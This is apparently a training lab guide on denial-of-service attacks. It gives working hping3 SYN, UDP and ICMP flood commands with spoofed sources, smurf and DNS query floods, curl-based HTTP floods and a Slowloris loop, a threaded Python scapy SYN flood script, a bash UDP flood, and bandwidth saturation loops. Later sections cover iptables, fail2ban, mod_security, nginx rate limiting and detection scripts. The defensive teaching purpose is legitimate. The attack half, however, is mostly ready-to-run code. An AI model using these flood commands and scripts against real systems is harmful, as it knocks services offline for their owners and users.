# DoS/DDoS Attack Simulation Lab

## ⚠️ IMPORTANT SAFETY NOTICE
**Only perform these attacks in isolated lab environments!**
**Never attack systems you don't own or lack explicit permission to test.**

## SYN Flood Attacks

### Basic SYN Flood
```bash
# Simple SYN flood
hping3 -S --flood -V 192.168.1.20

# SYN flood on specific port
hping3 -S -p 80 --flood -V 192.168.1.20

# Random source SYN flood
hping3 -S -p 80 --flood --rand-source 192.168.1.20

# Spoofed source SYN flood
hping3 -S -p 80 --flood -a 192.168.1.50 192.168.1.20
```

### Advanced SYN Techniques
```bash
# Fragmented SYN packets
hping3 -S -p 80 --flood -f 192.168.1.20

# Custom packet size
hping3 -S -p 80 --flood -d 1024 192.168.1.20

# Multiple ports
for port in 80 443 22 21; do
    hping3 -S -p $port --flood 192.168.1.20 &
done
```

## UDP Flood Attacks

### Basic UDP Flood
```bash
# Simple UDP flood
hping3 --udp --flood -V 192.168.1.20

# UDP flood on specific port
hping3 --udp -p 53 --flood 192.168.1.20

# Random port UDP flood
hping3 --udp --rand-dest --flood 192.168.1.20

# Large packet UDP flood
hping3 --udp --flood -d 65000 192.168.1.20
```

### DNS Amplification Simulation
```bash
# DNS query flood
dig @192.168.1.20 ANY google.com

# Automated DNS flood
for i in {1..1000}; do
    dig @192.168.1.20 ANY example$i.com &
done
```

## ICMP Flood Attacks

### Ping Flood
```bash
# Basic ping flood
hping3 --icmp --flood 192.168.1.20

# Large ICMP packets
hping3 --icmp --flood -d 65000 192.168.1.20

# Ping of death (fragmented)
ping -s 65507 192.168.1.20

# Smurf attack simulation
hping3 --icmp -a 192.168.1.20 192.168.1.255
```

## HTTP/Application Layer Attacks

### HTTP Flood
```bash
# Simple HTTP flood
for i in {1..1000}; do
    curl http://192.168.1.20/ &
done

# POST flood
for i in {1..1000}; do
    curl -X POST -d "data=test" http://192.168.1.20/login &
done

# Slowloris simulation
for i in {1..100}; do
    (echo -e "GET / HTTP/1.1\r\nHost: 192.168.1.20\r\n"; sleep 10; echo -e "\r\n") | nc 192.168.1.20 80 &
done
```

### Apache Bench (ab) Testing
```bash
# Concurrent connections test
ab -n 10000 -c 100 http://192.168.1.20/

# Keep-alive connections
ab -n 10000 -c 100 -k http://192.168.1.20/

# POST requests
ab -n 1000 -c 50 -p postdata.txt -T application/x-www-form-urlencoded http://192.168.1.20/login
```

## Custom DoS Scripts

### Python SYN Flood
```python
#!/usr/bin/env python3
from scapy.all import *
import random
import threading

def syn_flood(target_ip, target_port):
    while True:
        source_ip = ".".join(map(str, (random.randint(1,254) for _ in range(4))))
        source_port = random.randint(1024, 65535)
        
        packet = IP(src=source_ip, dst=target_ip) / TCP(sport=source_port, dport=target_port, flags="S")
        send(packet, verbose=0)

# Usage
target = "192.168.1.20"
port = 80

for i in range(10):
    thread = threading.Thread(target=syn_flood, args=(target, port))
    thread.daemon = True
    thread.start()
```

### Bash UDP Flood
```bash
#!/bin/bash
# UDP flood script

TARGET="192.168.1.20"
PORT="53"

while true; do
    echo "UDP_FLOOD_DATA" | nc -u $TARGET $PORT &
done
```

## Bandwidth Consumption

### Large File Downloads
```bash
# Multiple large file downloads
for i in {1..50}; do
    wget http://192.168.1.20/largefile.zip &
done

# Continuous download loop
while true; do
    wget -O /dev/null http://192.168.1.20/largefile.zip
done
```

### Network Saturation
```bash
# Iperf bandwidth test
iperf3 -c 192.168.1.20 -t 300 -P 10

# Custom bandwidth flood
dd if=/dev/zero bs=1M count=1000 | nc 192.168.1.20 80
```

## Defense Mechanisms

### iptables Rate Limiting
```bash
# SYN flood protection
iptables -A INPUT -p tcp --syn -m limit --limit 1/s --limit-burst 3 -j ACCEPT
iptables -A INPUT -p tcp --syn -j DROP

# ICMP rate limiting
iptables -A INPUT -p icmp --icmp-type echo-request -m limit --limit 1/s -j ACCEPT
iptables -A INPUT -p icmp --icmp-type echo-request -j DROP

# Connection limiting
iptables -A INPUT -p tcp --dport 80 -m connlimit --connlimit-above 20 -j DROP

# UDP flood protection
iptables -A INPUT -p udp -m limit --limit 5/s --limit-burst 10 -j ACCEPT
iptables -A INPUT -p udp -j DROP
```

### Fail2Ban Configuration
```bash
# DoS protection jail
cat > /etc/fail2ban/jail.d/dos-protection.conf << EOF
[http-dos]
enabled = true
port = http,https
filter = http-dos
logpath = /var/log/apache2/access.log
maxretry = 300
findtime = 300
bantime = 3600
action = iptables[name=HTTP, port=http, protocol=tcp]

[ssh-dos]
enabled = true
port = ssh
filter = sshd
logpath = /var/log/auth.log
maxretry = 5
findtime = 600
bantime = 3600
EOF
```

### Apache/Nginx Mitigation
```apache
# Apache mod_security rules
SecRule REQUEST_METHOD "@streq GET" \
    "id:1001,phase:2,block,msg:'GET flood detected',\
    setvar:'ip.get_counter=+1',expirevar:'ip.get_counter=60'"

SecRule IP:GET_COUNTER "@gt 100" \
    "id:1002,phase:2,block,msg:'GET flood threshold exceeded'"

# Rate limiting module
LoadModule mod_evasive24.so
<IfModule mod_evasive24.c>
    DOSHashTableSize    2048
    DOSPageCount        5
    DOSPageInterval     1
    DOSSiteCount        50
    DOSSiteInterval     1
    DOSBlockingPeriod   600
</IfModule>
```

```nginx
# Nginx rate limiting
http {
    limit_req_zone $binary_remote_addr zone=one:10m rate=1r/s;
    limit_conn_zone $binary_remote_addr zone=addr:10m;
    
    server {
        limit_req zone=one burst=5;
        limit_conn addr 10;
    }
}
```

## Monitoring and Detection

### Network Monitoring
```bash
# Monitor network connections
netstat -tulpn | grep :80

# Check connection states
ss -tuln | grep :80

# Monitor bandwidth usage
iftop -i eth0

# Packet capture during attack
tcpdump -i eth0 -w dos_attack.pcap host 192.168.1.20
```

### System Resource Monitoring
```bash
# CPU and memory usage
htop

# Load average
uptime

# Network statistics
cat /proc/net/netstat

# Connection tracking
cat /proc/net/nf_conntrack | wc -l
```

### Log Analysis
```bash
# Apache access log analysis
tail -f /var/log/apache2/access.log | grep -E "(40[0-9]|50[0-9])"

# Count requests per IP
awk '{print $1}' /var/log/apache2/access.log | sort | uniq -c | sort -nr | head -10

# Monitor error logs
tail -f /var/log/apache2/error.log
```

## Automated Detection Scripts

### Connection Monitor
```bash
#!/bin/bash
# Monitor for DoS attacks

THRESHOLD=100
LOGFILE="/var/log/dos_monitor.log"

while true; do
    CONNECTIONS=$(netstat -an | grep :80 | wc -l)
    
    if [ $CONNECTIONS -gt $THRESHOLD ]; then
        echo "$(date): DoS attack detected - $CONNECTIONS connections" >> $LOGFILE
        # Trigger mitigation
        iptables -A INPUT -p tcp --dport 80 -j DROP
    fi
    
    sleep 5
done
```

### Traffic Analysis
```python
#!/usr/bin/env python3
import psutil
import time

def monitor_traffic():
    old_stats = psutil.net_io_counters()
    
    while True:
        time.sleep(1)
        new_stats = psutil.net_io_counters()
        
        bytes_recv_per_sec = new_stats.bytes_recv - old_stats.bytes_recv
        packets_recv_per_sec = new_stats.packets_recv - old_stats.packets_recv
        
        if bytes_recv_per_sec > 10000000:  # 10MB/s threshold
            print(f"High traffic detected: {bytes_recv_per_sec/1024/1024:.2f} MB/s")
        
        if packets_recv_per_sec > 10000:  # 10k packets/s threshold
            print(f"High packet rate: {packets_recv_per_sec} packets/s")
        
        old_stats = new_stats

if __name__ == "__main__":
    monitor_traffic()
```

## Challenge Objectives

### Attack Simulation Goals
1. Understand different DoS attack vectors
2. Learn to use various attack tools
3. Measure attack effectiveness
4. Practice responsible testing

### Defense Implementation Goals
1. Configure rate limiting
2. Implement monitoring systems
3. Test mitigation effectiveness
4. Develop incident response procedures

### Learning Outcomes
- Understand DoS attack mechanisms
- Implement effective defenses
- Monitor and detect attacks
- Balance security with availability
- Develop mitigation strategies

## Ethical Guidelines

### Lab Environment Only
- Use only in isolated networks
- Never attack production systems
- Obtain explicit permission
- Document all activities

### Responsible Disclosure
- Report vulnerabilities properly
- Follow coordinated disclosure
- Respect system owners
- Focus on defensive improvements
